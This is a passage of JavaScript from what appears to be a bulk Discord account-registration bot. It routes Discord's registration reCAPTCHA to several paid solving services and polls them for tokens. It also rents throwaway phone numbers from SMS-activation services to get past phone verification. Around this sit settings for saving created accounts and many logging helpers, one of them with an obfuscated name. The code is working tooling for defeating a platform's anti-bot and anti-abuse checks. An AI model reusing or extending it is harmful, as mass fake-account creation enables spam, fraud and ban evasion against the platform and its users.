            add_log_dont_g_acap(1);
            return false;
          }
          clearInterval(time);
          var token = body.solution.gRecaptchaResponse;
          add_log_success_acap(potok_number);
          return fin({type: true, token: token});
        });
      }, 7.5 * 1000);
    });
  });
}

function res_capcloud(key, url, potok_number = 1, too_long = false) {
  return new Promise(fin => {
    add_log_send_acap(potok_number);
    req({
      method: 'POST',
      body: JSON.stringify({
        clientKey: apikey_captcha,
        task: {
          type: 'NoCaptchaTaskProxyless',
          websiteURL: url,
          websiteKey: key,
        },
      }),
      url: 'https://api.capmonster.cloud/createTask'
    }, (err, response, body) => {
      log(body);
      if (err || !response || response.statusCode != 200 || !body) {
        add_log_err_acap(potok_number, body);
        return fin({type: false, err: 974});
      }
      body = JSON.parse(body);
      if (body.errorId != 0) {
        add_log_dont_w_acap(potok_number);
        if (body.errorCode == 'ERROR_KEY_DOES_NOT_EXIST') return fin({type: false, err: 'wrong_key'});
        if (body.errorCode == 'ERROR_ZERO_BALANCE') return fin({type: false, err: 'balance'});
        return fin({type: false});
      }
      var id = body.taskId;
      var i = 0;
      add_log_success_cre_capcloud(potok_number);
      var time = setInterval(() => {
        add_log_check_task_capcloud(potok_number)
        i++;
        if (!too_long) {
          if (i > 30) {
            clearInterval(time);
            meAtztGn1pdERnu('TIMER!');
            add_log_dont_work_capcloud(potok_number);
            return fin({type: false});
          }
        } else {
          if (i > 30) {
            clearInterval(time);
            meAtztGn1pdERnu('TIMER!');
            add_log_dont_work_capcloud(potok_number);
            return fin({type: false});
          }
        }
        req({
          method: 'POST',
          body: JSON.stringify({
            clientKey: apikey_captcha,
            taskId: id
          }),
          url: 'https://api.capmonster.cloud/getTaskResult'
        }, (err, response, body) => {
          log(body);
          if (err || !response || response.statusCode != 200 || !body) {
            clearInterval(time);
            add_log_dont_work_capcloud(potok_number);
            return fin({type: false, err: 479});
          }
          body = JSON.parse(body);
          if (body.errorId != 0) {
            if (body.errorCode == 'ERROR_KEY_DOES_NOT_EXIST') return fin({type: false, err: 'wrong_key'});
            if (body.errorCode == 'ERROR_ZERO_BALANCE') return fin({type: false, err: 'balance'});
            if (body.errorCode == 'ERROR_CAPTCHA_UNSOLVABLE') return fin({type: false, err: 'dont_res'});
            return fin({type: false});
          }
          if (body.status != 'ready') {
            add_log_dont_capcloud(1);
            return false;
          }
          clearInterval(time);
          var token = body.solution.gRecaptchaResponse;
          add_log_success_capcloud(potok_number);
          return fin({type: true, token: token});
        });
      }, 7.5 * 1000);
    });
  });
}

function add_log_send_rucap(n) {
  var html = `${translater(translate[0])}`;
  add_log(html, n)
}

function add_log_send_capgur(n) {
  var html = `${translater(translate[126])}`;
  add_log(html, n)
}

function add_log_send_azcap(n) {
  var html = `${translater(new_translate.send_new_task_azcap)}`;
  add_log(html, n)
}

function add_log_send_dbcap(n) {
  var html = `${translater(translate[127])}`;
  add_log(html, n)
}

function add_log_err_dbcap(n) {
  var html = `<v class="log_error">${translater(translate[128])}</v>`;
  add_log(html, n)
}

function add_log_dont_w_dbcap(n) {
  var html = `<v class="log_error">${translater(translate[129])}</v>`;
  add_log(html, n)
}

function add_log_success_cre_dbcap(n) {
  var html = `${translater(translate[130])}`;
  add_log(html, n)
}

function add_log_success_capgur(n) {
  var html = `${translater(translate[142])}`;
  add_log(html, n)
}

function add_log_success_azcap(n) {
  var html = `${translater(new_translate.success_complete_task_azcap)}`;
  add_log(html, n)
}

function add_log_check_task_dbcap(n) {
  var html = `${translater(translate[131])}`;
  add_log(html, n)
}

function add_log_dont_work_dbcap(n) {
  var html = `<v class="log_error">${translater(translate[132])}</v>`;
  add_log(html, n)
}

function add_log_dont_g_dbcap(n) {
  var html = `${translater(translate[133])}`;
  add_log(html, n)
}

function add_log_send_capgur(n) {
  var html = `${translater(translate[126])}`;
  add_log(html, n)
}

function add_log_err_capgur(n) {
  var html = `<v class="log_error">${translater(translate[135])}</v>`;
  add_log(html, n)
}

function add_log_dont_w_capgur(n) {
  var html = `<v class="log_error">${translater(translate[136])}</v>`;
  add_log(html, n)
}

function add_log_success_cre_capgur(n) {
  var html = `${translater(translate[137])}`;
  add_log(html, n)
}

function add_log_check_task_capgur(n) {
  var html = `${translater(translate[138])}`;
  add_log(html, n)
}

function add_log_dont_work_capgur(n) {
  var html = `<v class="log_error">${translater(translate[139])}</v>`;
  add_log(html, n)
}

function add_log_dont_g_capgur(n) {
  var html = `${translater(translate[140])}`;
  add_log(html, n)
}



function add_log_send_azcap(n) {
  var html = `${translater(new_translate.send_new_task_azcap)}`;
  add_log(html, n)
}

function add_log_err_azcap(n) {
  var html = `<v class="log_error">${translater(new_translate.error_serv_azcap)}</v>`;
  add_log(html, n)
}

function add_log_dont_w_azcap(n) {
  var html = `<v class="log_error">${translater(new_translate.dont_create_task_azcap)}</v>`;
  add_log(html, n)
}

function add_log_success_cre_azcap(n) {
  var html = `${translater(new_translate.success_create_task_azcap)}`;
  add_log(html, n)
}

function add_log_check_task_azcap(n) {
  var html = `${translater(new_translate.checking_task_azcap)}`;
  add_log(html, n)
}

function add_log_dont_work_azcap(n) {
  var html = `<v class="log_error">${translater(new_translate.dont_success_task_azcap)}</v>`;
  add_log(html, n)
}

function add_log_dont_g_azcap(n) {
  var html = `${translater(new_translate.not_yet_success_task_azcap)}`;
  add_log(html, n)
}

function add_log_dont_w_rucap(n) {
  var html = `<v class="log_error">${translater(translate[2])}</v>`;
  add_log(html, n)
}

function add_log_success_cre_rucap(n) {
  var html = `${translater(translate[3])}`;
  add_log(html, n)
}

function add_log_check_task_rucap(n) {
  var html = `${translater(translate[4])}`;
  add_log(html, n)
}

function add_log_dont_work_rucap(n) {
  var html = `<v class="log_error">${translater(translate[5])}</v>`;
  add_log(html, n)
}

function add_log_dont_g_rucap(n) {
  var html = `${translater(translate[6])}`;
  add_log(html, n)
}

function add_log_send_acap(n) {
  var html = `${translater(translate[7])}`;
  add_log(html, n)
}

function add_log_err_acap(n, err) {
  var html = `<v class="log_error">${translater(translate[8], false, {err: err})}</v>`;
  add_log(html, n)
}

function add_log_err_rucap(n, err) {
  var html = `<v class="log_error">${translater(translate[2], false, {err: err})}</v>`;
  add_log(html, n)
}

function add_log_dont_w_acap(n) {
  var html = `<v class="log_error">${translater(translate[9])}</v>`;
  add_log(html, n)
}

function add_log_success_cre_acap(n) {
  var html = `${translater(translate[10])}`;
  add_log(html, n)
}

function add_log_success_cre_capcloud(n) {
  var html = `${translater(new_translate.success_create_task_capcloud)}`;
  add_log(html, n)
}

function add_log_check_task_acap(n) {
  var html = `${translater(translate[141])}`;
  add_log(html, n)
}

function add_log_check_task_capcloud(n) {
  var html = `${translater(new_translate.check_capcloud_task)}`;
  add_log(html, n)
}

function add_log_dont_work_acap(n) {
  var html = `<v class="log_error">${translater(translate[12])}</v>`;
  add_log(html, n)
}

function add_log_dont_work_capcloud(n) {
  var html = `<v class="log_error">${translater(new_translate.dont_did_capcloud_task)}</v>`;
  add_log(html, n)
}

function add_log_dont_g_acap(n) {
  var html = `${translater(translate[13])}`;
  add_log(html, n)
}

function add_log_dont_capcloud(n) {
  var html = `${translater(new_translate.not_finish_task_capcloud)}`;
  add_log(html, n)
}

function add_log_dont_g_cm() {
  var html = `${translater(translate[14])}`;
  add_log(html, 1);
}

function add_log_success_rucap(n) {
  var html = `${translater(translate[15])}`;
  add_log(html, n)
}

function add_log_success_acap(n) {
  var html = `${translater(translate[16])}`;
  add_log(html, n)
}

function add_log_success_capcloud(n) {
  var html = `${translater(new_translate.success_finish_task_capcloud)}`;
  add_log(html, n)
}

function add_log_bac_cm_url() {
  var html = `${translater(translate[17])}`;
  add_log(html, 1)
}

function add_log_bac_cm_req() {
  var html = `${translater(translate[18])}`;
  add_log(html, 1)
}

function add_log_check_task_cm() {
  var html = `${translater(translate[19])}`;
  add_log(html, 1)
}

function add_log_dont_work_cm() {
  var html = `<v class="log_error">${translater(translate[20])}</v>`;
  add_log(html, 1)
}

function add_log_success_cm() {
  var html = `${translater(translate[21])}`;
  add_log(html, 1)
}

function add_log_success_dbcap(n = 1) {
  var html = `${translater(translate[142])}`;
  add_log(html, 1)
}

$('body').on('change', '#select-status-online-of-accs', function () {
  update_tmp('select-status-online-of-accs', $(this).val());
});

$('body').on('change', '#online_accs_enabler', function () {
  var check = $(this).prop('checked');
  if (check) {
    $('#online_accs_block').addClass('active');
  } else {
    $('#online_accs_block').removeClass('active');
  }
  update_tmp('online_accs_enabler', check);
});

$('body').on('change', '#save_discrim_accs_enabler', function () {
  var v = $(this).prop('checked');
  update_tmp('save_discrim_accs_enabler', v);
  if (v && tmp_data['export-discrim-accs-file']) {
    $('#name-of-export-discrims-file').addClass('active');
  } else {
    $('#name-of-export-discrims-file').removeClass('active');
  }
});

$('body').on('change', '#discrims-for-save', function () {
  update_tmp('discrims-for-save', $(this).val());
})

function res_cap(key, url, potok_number = 1, dbcapi = $('#apikey_captcha').val(), proxy = false, too_long = false) {
  return new Promise(async (fin, fal) => {
    try {
      //noty('warning', `Start Captcha! ${apikey_captcha} ${key} ${potok_number}`);
      if (!key) return fin({ type: false });
      proxy = false;
      meAtztGn1pdERnu('apikey_captcha: ' + apikey_captcha);
      if (check_cap_monster) {
        if (!tmp_data['cap_monster_url']) return fin({ type: false, err: 'cap_monster_url' });
        var cap_monster_url = tmp_data['cap_monster_url'];
        var params = {
          url: `http://${cap_monster_url}/in.php?key=123sdffff&method=userrecaptcha&googlekey=${c.data_key}&pageurl=https://discord.com/register`
        };
        req(params, (err, response, body) => {
          meAtztGn1pdERnu(body);
          if (err || !response || !body) {
            add_log_bac_cm_url();
            return fin({ type: false });
          }
          body = body.split('|');
          if (body[0] != 'OK') {
            add_log_bac_cm_req();
            return fin({ type: false });
          }
          var id = body[1];
          var i = 0;
          var timer = setInterval(() => {
            i++;
            add_log_check_task_cm()
            if (i > 20) {
              clearInterval(timer);
              add_log_dont_work_cm();
              return fin({ type: false });
            }
            var params = {
              method: 'GET',
              url: `http://${cap_monster_url}/res.php?action=get&id=${id}`
            };
            req(params, (err, response, body) => {
              log(body);
              i++;
              if (err || !response || response.statusCode != 200 || !body) {
                add_log_dont_work_cm();
                clearInterval(timer);
                return fin({ type: false });
              }
              if (body == 'CAPCHA_NOT_READY' || body.split('|')[0] != 'OK') return add_log_dont_g_cm();
              clearInterval(timer);
              var token = body.split('|')[1];
              add_log_success_cm();
              return fin({ type: true, token: token });
            });
          }, 7.5 * 1000);
        })
      } else {
        if (type_captcha == 2) {
          res_anticap(key, url, 1, too_long).then(check => {
            if (!check.type) return fin({ type: false, err: check.err });
            return fin({ type: true, token: check.token });
          })
        } else if (type_captcha == 10) {
          var username = dbcapi.split(':')[0];
          var password = dbcapi.split(':')[1];
          var token_params = JSON.stringify({
            googlekey: c.data_key,
            pageurl: c.register
          })
          var params = {
            url: 'http://api.dbcapi.me/api/captcha',
            method: 'POST',
            form: {
              username: username,
              password: password,
              type: '4',
              token_params: token_params
            },
            headers: {
              'accept': 'application/json'
            }
          }
          add_log_send_dbcap(potok_number);
          req(params, (err, response, body) => {
            meAtztGn1pdERnu(body);
            meAtztGn1pdERnu(response.statusCode);
            if (err || !response || !body || body.indexOf('Unable to complete') >= 0) {
              //noty('error', body);
              add_log_err_dbcap(potok_number);
              return fin({ type: false });
            }
            body = JSON.parse(body);
            if (!body.is_correct || !body.captcha) {
              //noty('error', '123');
              add_log_dont_w_dbcap(1);
              return fin({ type: false });
            }
            add_log_success_cre_dbcap(1);
            var id = body.captcha;
            var i = 0;
            var timer = setInterval(() => {
              if (!too_long) {
                if (i > 20) {
                  clearInterval(timer);
                  return fin({ type: false });
                }
              } else {
                if (i > 20) {
                  clearInterval(timer);
                  return fin({ type: false });
                }
              }
              var params = {
                method: 'GET',
                url: `http://api.dbcapi.me/api/captcha/${id}`,
                headers: {
                  'accept': 'application/json'
                }
              };
              add_log_check_task_dbcap(1);
              req(params, (err, response, body) => {
                log(body);
                i++;
                if (err || !response || !body) {
                  add_log_dont_work_dbcap(potok_number);
                  clearInterval(timer);
                  return fin({ type: false });
                }
                body = JSON.parse(body);
                if (body.text.length < 5) return add_log_dont_g_dbcap(potok_number);
                clearInterval(timer);
                if (!body.text) return fin({ type: false });
                add_log_success_dbcap(potok_number);
                var token = body.text;
                return fin({ type: true, token: token });
              });
            }, 7.5 * 1000);
          })
        } else if (type_captcha == 12) {
          var params = {
            method: 'GET',
            url: `http://api.captcha.guru/in.php?key=${apikey_captcha}&method=userrecaptcha&googlekey=${key}&pageurl=${url}&json=1`
          };
          add_log_send_capgur(potok_number);
          req(params, (err, response, body) => {
            log(body);
            if (err || !response || response.statusCode != 200 || !body) {
              add_log_err_capgur(potok_number);
              return fin({ type: false });
            }
            body = JSON.parse(body);
            if (body.status != 1) {
              add_log_dont_w_capgur(potok_number);
              return fin({ type: false });
            }
            add_log_success_cre_capgur(potok_number);
            var id = body.request;
            var i = 0;
            var timer = setInterval(() => {
              add_log_check_task_capgur(potok_number)
              if (!too_long) {
                if (i > 20) {
                  clearInterval(timer);
                  add_log_dont_work_capgur(potok_number);
                  return fin({ type: false });
                }
              } else {
                if (i > 20) {
                  clearInterval(timer);
                  add_log_dont_work_capgur(potok_number);
                  return fin({ type: false });
                }
              }
              var params = {
                method: 'GET',
                url: `http://api.captcha.guru/res.php?key=${apikey_captcha}&action=get&id=${id}&json=1`
              };
              req(params, (err, response, body) => {
                log(body);
                i++;
                if (err || !response || response.statusCode != 200 || !body) {
                  add_log_dont_work_capgur(potok_number);
                  clearInterval(timer);
                  return fin({ type: false });
                }
                body = JSON.parse(body);
                if (body.request == 'CAPCHA_NOT_READY' || body.status != 1) return add_log_dont_g_capgur(potok_number);
                clearInterval(timer);
                add_log_success_capgur(potok_number);
                var token = body.request;
                return fin({ type: true, token: token });
              });
            }, 7.5 * 1000);
          });
        } else if (type_captcha == 13) {
          var params = {
            method: 'GET',
            url: `http://azcaptcha.com/in.php?key=${apikey_captcha}&method=userrecaptcha&googlekey=${key}&pageurl=${url}&json=1`
          };
          add_log_send_azcap(potok_number);
          req(params, (err, response, body) => {
            log(body);
            if (err || !response || response.statusCode != 200 || !body) {
              add_log_err_azcap(potok_number);
              return fin({ type: false });
            }
            body = JSON.parse(body);
            if (body.status != 1) {
              add_log_dont_w_azcap(potok_number);
              return fin({ type: false });
            }
            add_log_success_cre_azcap(potok_number);
            var id = body.request;
            var i = 0;
            var timer = setInterval(() => {
              add_log_check_task_azcap(potok_number)
              if (!too_long) {
                if (i > 20) {
                  clearInterval(timer);
                  add_log_dont_work_azcap(potok_number);
                  return fin({ type: false });
                }
              } else {
                if (i > 20) {
                  clearInterval(timer);
                  add_log_dont_work_azcap(potok_number);
                  return fin({ type: false });
                }
              }
              var params = {
                method: 'GET',
                url: `http://azcaptcha.com/res.php?key=${apikey_captcha}&action=get&id=${id}&json=1`
              };
              req(params, (err, response, body) => {
                log(body);
                i++;
                if (err || !response || response.statusCode != 200 || !body) {
                  add_log_dont_work_azcap(potok_number);
                  clearInterval(timer);
                  return fin({ type: false });
                }
                body = JSON.parse(body);
                if (body.request == 'CAPCHA_NOT_READY' || body.status != 1) return add_log_dont_g_azcap(potok_number);
                clearInterval(timer);
                add_log_success_azcap(potok_number);
                var token = body.request;
                return fin({ type: true, token: token });
              });
            }, 7.5 * 1000);
          });
        } else if (type_captcha == 14) {
          var check = await res_capcloud(key, url, 1, too_long)
          if (!check.type) return fin({ type: false, err: check.err });
          return fin({ type: true, token: check.token });
        } else {
          // if (proxy) {
          //   var proxytype = 'HTTP';
          //   if (tmp_data['proxy_type'] != 'http') proxytype = 'SOCKS5';
          //   var params = {
          //     method: 'GET',
          //     url: `https://rucaptcha.com/in.php?key=${apikey_captcha}&method=userrecaptcha&googlekey=${key}&pageurl=${url}&json=1&proxy=${proxy}&proxytype=${proxytype}`
          //   };
          // } else {
          //   var params = {
          //     method: 'GET',
          //     url: `https://rucaptcha.com/in.php?key=${apikey_captcha}&method=userrecaptcha&googlekey=${key}&pageurl=${url}&json=1`
          //   };
          // }
          var params = {
            method: 'GET',
            url: `https://rucaptcha.com/in.php?key=${apikey_captcha}&method=userrecaptcha&googlekey=${key}&pageurl=${url}&json=1&soft_id=2831`
          };
          add_log_send_rucap(potok_number);
          req(params, (err, response, body) => {
            //noty('warning', body);
            if (err || !response || response.statusCode != 200 || !body) {
              add_log_err_rucap(potok_number);
              return fin({ type: false, err: 1 });
            }
            if (body.indexOf('{') < 0) {
              if (body.indexOf('OK') < 0) {
                //noty('warning', '2')
                add_log_dont_w_rucap(potok_number);
                //noty('error', body);
                return fin({ type: false, err: 2 });
              }
              add_log_success_cre_rucap(potok_number);
              var id = body.replace(/\D+/g, "");
            } else {
              body = JSON.parse(body);
              if (body.status != 1) {
                //noty('warning', '1')
                add_log_dont_w_rucap(potok_number);
                //noty('error', JSON.stringify(body));
                return fin({ type: false, err: 3 });
              }
              add_log_success_cre_rucap(potok_number);
              var id = body.request;
            }
            var i = 0;
            var timer = setInterval(() => {
              add_log_check_task_rucap(potok_number)
              if (!too_long) {
                if (i > 20) {
                  clearInterval(timer);
                  add_log_dont_work_rucap(potok_number);
                  return fin({ type: false, err: 4 });
                }
              } else {
                if (i > 20) {
                  clearInterval(timer);
                  add_log_dont_work_rucap(potok_number);
                  return fin({ type: false, err: 5 });
                }
              }
              var params = {
                method: 'GET',
                url: `https://rucaptcha.com/res.php?key=${apikey_captcha}&action=get&id=${id}&json=1`
              };
              req(params, (err, response, body) => {
                log(body);
                i++;
                if (err || !response || response.statusCode != 200 || !body) {
                  add_log_dont_work_rucap(potok_number);
                  clearInterval(timer);
                  return fin({ type: false, err: 6 });
                }
                body = JSON.parse(body);
                if (body.request == 'CAPCHA_NOT_READY' || body.status != 1) return add_log_dont_g_rucap(potok_number);
                clearInterval(timer);
                add_log_success_rucap(potok_number);
                var token = body.request;
                return fin({ type: true, token: token });
              });
            }, 7.5 * 1000);
          });
        }
      }
    } catch (err) {
      // noty('error', '6');      
      // noty('error', err.toString());
      return fin({type: false});
    }    
  });
}

function finish_sms(id) {
  return new Promise(fin => {
    if (!id) return fin({type: false});
    req({
      method: 'GET',
      url: `http://api.sms-reg.com/setOperationOk.php?tzid=${id}&apikey=${apikey_verify_phone}`
    }, (err, response, body) => {
      return fin({type: true});
    });
  });
}

function get_substr_country() {
  var c = country;
  var a;
  if (type_verify == 6) {
    if (c == 'ru') {
      a = 2;
    } else if (c == 'ua') {
      a = 4
    } else if (c == 'kz') {
      a = 3
    } else {
      a = 3
    }
  } else if (type_verify != 5) {
    if (c == 'ru') {
      a = 1;
    } else if (c == 'ua') {
      a = 3
    } else if (c == 'kz') {
      a = 2
    } else {
      a = 2
    }
  } else {
    a = 2;
  }
  return a;
}

function get_api_code_country() {
  var c = country;
  var a;
  if (type_verify == 2) {
    a = c;
    if (inArray(c, ['lv', 'rm', 'pl', 'kg', 'fi', 'se', 'ee', 'lt'])) a = 'ua';
  } else if (type_verify == 3) {
    if (c == 'ru') {
      a = 0;
    } else if (c == 'ua') {
      a = 1;
    } else if (c == 'ua') {
      a = 1;
    } else if (c == 'lv') {
      a = 49;
    } else if (c == 'rm') {
      a = 32;
    } else if (c == 'pl') {
      a = 15;
    } else if (c == 'kg') {
      a = 11;
    } else if (c == 'se') {
      a = 46;
    } else if (c == 'ee') {
      a = 34;
    } else if (c == 'lt') {
      a = 44;
    } else if (c == 'nl') {
      a = 48;
    } else if (c == 'gb') {
      a = 16;
    } else if (c == 'us') {
      a = 12;
    } else {
      a = 2;
    }
  } else if (type_verify == 6) {
    if (c == 'ru') {
      a = 7
    } else if (c == 'ua') {
      a = 380
    } else if (c == 'kz') {
      a = 77
    } else if (c == 'lv') {
      a = 371
    } else if (c == 'pl') {
      a = 48
    } else if (c == 'ee') {
      a = 372
    } else if (c == 'gb') {
      a = 44;
    } else if (c == 'us') {
      a = 1;
    } else if (c == 'es') {
      a = 34;
    } else if (c == 'fr') {
      a = 33;
    } else {
      a = 77
    }
  } else if (type_verify == 5) {
    if (c == 'ru') {
      a = 7
    } else if (c == 'ua') {
      a = 380
    } else if (c == 'kz') {
      a = 77
    } else {
      a = 77
    }
  } else if (type_verify == 7) {
    if (c == 'ru') {
      a = 0
    } else if (c == 'ua') {
      a = 1
    } else if (c == 'kz') {
      a = 2
    } else if (c == 'lv') {
      a = 'latvia'
    } else if (c == 'rm') {
      a = 'romania'
    } else if (c == 'pl') {
      a = 'poland'
    } else if (c == 'gb') {
      a = 'england';
    } else if (c == 'us') {
      a = 'usa';
    } else if (c == 'fr') {
      a = 'france';
    } else if (c == 'es') {
      a = 'spain';
    } else if (c == 'ca') {
      a = 'canada';
    } else {
      a = 1
    }
  } else if (type_verify == 8) {
    if (c == 'ru') {
      a = 0
    } else if (c == 'kz') {
      a = 2
    } else if (c == 'pl') {
      a = 15
    } else {
      a = 1
    }
  } else if (type_verify == 9) {
    a = c;
  } else if (type_verify == 10 || type_verify == 11) {
    if (c == 'rm') {
      a = 'RO'
    } else if (c == 'gb') {
      a = 'UK'
    } else {
      a = c.toUpperCase();
    }
  }
  return a;
}

function add_log_get_phone_smsreg(n) {
  var html = `${translater(translate[22])}`;
  add_log(html, n);
}

function add_log_of_create_tz_sms_reg(id, n) {
  var html = `${translater(translate[23], false, {id: id})}`;
  add_log(html, n);
}

function add_log_of_wr_sms_reg(n) {
  var html = `<v class="log_error">${translater(translate[24])}</v>`;
  add_log(html, n);
}

function add_log_of_sms_reg_15min(n) {
  var html = `<v class="log_error">${translater(translate[25])}</v>`;
  add_log(html, n);
}

function add_log_pol_sms_reg(n) {
  var html = `${translater(translate[26])}`;
  add_log(html, n);
}

function add_log_no_nums_sms_reg(n) {
  var html = `${translater(translate[27])}`;
  add_log(html, n);
}

function add_log_suc_get_number(num, n, service) {
  var html = `${translater(new_translate.suc_get_number, false, {num: num})}`;
  add_log(html, n);
}

function get_phone_smsreg(potok_number = 1) {
  return new Promise((fin) => {
    add_log_get_phone(potok_number, 'sms-reg.com');
    req({
        method: 'GET',
        url: `http://api.sms-reg.com/getNum.php?apikey=${apikey_verify_phone}&service=other&country=${get_api_code_country()}`
      }, (err, response, body) => {
      if (err || !response || response.statusCode != 200 || !body) {
        add_log_of_wr_sms_reg(potok_number);
        return fin({type: false});
      }
      body = JSON.parse(body);
      if (body.response == 'WARNING_WAIT15MIN') {
        add_log_of_wr_sms_reg(potok_number);
        return fin({type: false, err: 'wait'});
      }
      if (body.response != 1) {
        add_log_of_wr_sms_reg(potok_number);
        return fin({type: false});
      }
      var id = body.tzid;
      add_log_of_create_tz_sms_reg(id, potok_number);
      var i = 0;
      var timer = setInterval(() => {
        add_log_pol_sms_reg(potok_number);
        i++;
        if (i > 3) {
          add_log_dont_have_phone(n)
          clearInterval(timer);
          return fin({type: false});
        }
        req({
          method: 'GET',
          url: `http://api.sms-reg.com/getState.php?tzid=${id}&apikey=${apikey_verify_phone}`
        }, (err, response, body) => {
          meAtztGn1pdERnu(body);
          if (err || !response || response.statusCode != 200 || !body) return fin({type: false});
          body = JSON.parse(body);
          if (body.response == 'WARNING_NO_NUMS' || body.response == 'NO_SERVICE') {
            clearInterval(timer);
            add_log_no_nums_sms_reg(potok_number);
            return fin({type: false});
          }
          if (body.response != 'TZ_NUM_PREPARE') return false;
          clearInterval(timer);
          var number = body.number;
          add_log_suc_get_number(number, potok_number);
          set_ready_number(id).then(() => {
            meAtztGn1pdERnu('SSSSDDALSD');
            return fin({type: true, number: number, id: id});
          }, (r) => {
            meAtztGn1pdERnu('SSS SDSAD :'+r);
            return fin({type: true, number: number, id: id});
          });
        });
      }, 12 * 1000);
    })
  });
}

function add_log_wrnog_code(n) {
  var html = `${translater(translate[29])}`;
  add_log(html, n);
}

function get_code_from_phone_sms_reg(id, n = 1) {
  add_log_inf_code_phone(n);
  meAtztGn1pdERnu(id);
  return new Promise((fin) => {
    var i = 0;
    var timer = setInterval(() => {
      add_log_inf_code_phone(n);
      i++;
      if (i > 20) {
        add_log_dont_have_code_sms_time(n);
        clearInterval(timer);
        meAtztGn1pdERnu('type 3');
        return fin({type: false});
      }
      req({
        method: 'GET',
        url: `http://api.sms-reg.com/getState.php?tzid=${id}&apikey=${apikey_verify_phone}`
      }, (err, response, body) => {
        //meAtztGn1pdERnu('body: '+body);
        if (err || !body) {
          add_log_wrnog_code(n);
          clearInterval(timer);
          meAtztGn1pdERnu('type 1');
          return fin({type: false});
        }
        body = JSON.parse(body);
        if (body.response == 'TZ_OVER_OK' || body.response == 'TZ_OVER_NR' || body.response == 'TZ_OVER_EMPTY') {
          add_log_dont_have_code_sms(n);
          clearInterval(timer);
          meAtztGn1pdERnu('type 2');
          return fin({type: false});
        }
        if (body.response == 'TZ_NUM_WAIT') return false;
        clearInterval(timer);
        var code = body.msg;
        meAtztGn1pdERnu('code: '+code);
        code = code.substr(code.indexOf(':')+1).replace(' ', '')
        code = code.replace(' ', '');
        add_log_success_get_code_sms(code, n)
        return fin({type: true, code: code});
      });
    }, 7 * 1000);
  });
}

function get_code_from_phone_onlinesim(id, n = 1) {
  return new Promise((fin) => {
    var i = 0;
    var timer = setInterval(() => {
      add_log_inf_code_phone(n);
      i++;
      if (i > 20) {
        add_log_dont_have_code_sms_time(n);
        clearInterval(timer);
        meAtztGn1pdERnu('type 3');
        return fin({type: false});
      }
      req({
        method: 'GET',
        url: `http://onlinesim.ru/api/getState.php?tzid=${id}&apikey=${apikey_verify_phone}`
      }, (err, response, body) => {
        //meAtztGn1pdERnu('body: '+body);
        if (err || !body) {
          clearInterval(timer);
          meAtztGn1pdERnu('type 1');
          return fin({type: false});
        }
        body = JSON.parse(body)[0];
        if (body.response == 'WARNING_NO_NUMS' || body.response == 'TZ_OVER_OK' || body.response == 'TZ_OVER_EMPTY') {
          add_log_dont_have_code_sms(n);
          clearInterval(timer);
          meAtztGn1pdERnu('type 2');
          return fin({type: false});
        }
        if (body.response == 'TZ_NUM_WAIT') return false;
        clearInterval(timer);
        var code = body.msg;
        meAtztGn1pdERnu('code: '+code);
        code = code.replace(' ', '');
        add_log_success_get_code_sms(code, n);
        return fin({type: true, code: code});
      });
    }, 7 * 1000);
  });
}

function set_ready_number(id) {
  return new Promise((fin) => {
    //return fin({type: true});
    if (!id) return fin({type: false});
    req({
      method: 'GET',
      url: `http://api.sms-reg.com/setReady.php?tzid=${id}&apikey=${apikey_verify_phone}`
    }, (err, response, body) => {
      if (err || !response || response.statusCode != 200 || !body) return fin({type: false});
      body = JSON.parse(body);
      if (body.response != 1) return fin({type: false});
      return fin({type: true});
    });
  });
}

// get_phone_onlinesim(potok_number).then((phone) => {
//   if (!phone.type) return false;
//   last_number = {
//     phone: phone.number,
//     id: phone.id
//   };
// })

function add_log_get_phone_smsactivate(n) {
  var html = `${translater(translate[30])}`;
  add_log(html, n);
}

function add_log_get_phone_5sim(n) {
  var html = `${translater(translate[160])}`;
  add_log(html, n);
}

function add_log_get_phone_sms_online(n) {
  var html = `${translater(new_translate.sms_on_get)}`;
  add_log(html, n);
}

function add_log_get_phone_vak_sms(n) {
  var html = `${translater(new_translate.vak_sms_get)}`;
  add_log(html, n);
}

function add_log_get_phone_simsms(n) {
  var html = `${translater(new_translate.simsms_get)}`;
  add_log(html, n);
}

function add_log_get_phone_simspva(n) {
  var html = `${translater(new_translate.simspva_get)}`;
  add_log(html, n);
}

function add_log_of_create_tz_smsactivate(n) {
  var html = `${translater(translate[31])}`;
  add_log(html, n);
}

function add_log_of_wr_smsactivate(n) {
  var html = `<v class="log_error">${translater(translate[24])}</v>`;
  add_log(html, n);
}

function add_log_of_smsactivate_ban(n) {
  var html = `<v class="log_error">${translater(translate[32])}</v>`;
  add_log(html, n);
}

function add_log_of_5sim_ban(n) {
  var html = `<v class="log_error">${translater(translate[162])}</v>`;
  add_log(html, n);
}

function add_log_of_sms_online_ban(n) {
  var html = `<v class="log_error">${translater(new_translate.sms_on_ban)}</v>`;
  add_log(html, n);
}

function add_log_of_vak_sms_ban(n) {
  var html = `<v class="log_error">${translater(new_translate.vak_sms_ban)}</v>`;
  add_log(html, n);
}

function add_log_of_ban(n, service) {
  var html = `<v class="log_error">${translater(new_translate.ban, false, {service: service})}</v>`;
  add_log(html, n);
}

function add_log_of_smsactivate_not_bal(n) {
  var html = `<v class="log_error">${translater(translate[33])}</v>`;
  add_log(html, n);
}

function add_log_of_5sim_not_bal(n) {
  var html = `<v class="log_error">${translater(translate[161])}</v>`;
  add_log(html, n);
}

function add_log_of_sms_online_not_bal(n) {
  var html = `<v class="log_error">${translater(new_translate.sms_on_funds)}</v>`;
  add_log(html, n);
}

function add_log_of_vak_sms_not_bal(n) {
  var html = `<v class="log_error">${translater(new_translate.vak_sms_funds)}</v>`;
  add_log(html, n);
}

function add_log_of_not_bal(n, service) {
  var html = `<v class="log_error">${translater(new_translate.not_funds, false, {service: service})}</v>`;
  add_log(html, 1);
}

function add_log_pol_smsactivate(n) {
  var html = `${translater(translate[26])}`;
  add_log(html, n);
}

function add_log_no_nums_smsactivate(n) {
  var html = `${translater(translate[34])}`;
  add_log(html, n);
}

function add_log_no_nums_5sim(n) {
  var html = `${translater(translate[160])}`;
  add_log(html, n);
}

function add_log_no_nums_sms_online(n) {
  var html = `${translater(new_translate.sms_on_over)}`;
  add_log(html, n);
}

function add_log_no_nums_vak_sms(n) {
  var html = `${translater(new_translate.vak_sms_over)}`;
  add_log(html, n);
}

function add_log_no_nums(n, service) {
  var html = `${translater(new_translate.numbers_over, false, {service: service})}`;
  add_log(html, n);
}

function add_log_wrnog_key_smsactivate(n) {
  var html = `<v class="log_error">${translater(translate[35])}</v>`;
  add_log(html, n);
}

function add_log_wrnog_key_5sim(n) {
  var html = `<v class="log_error">${translater(translate[165])}</v>`;
  add_log(html, n);
}

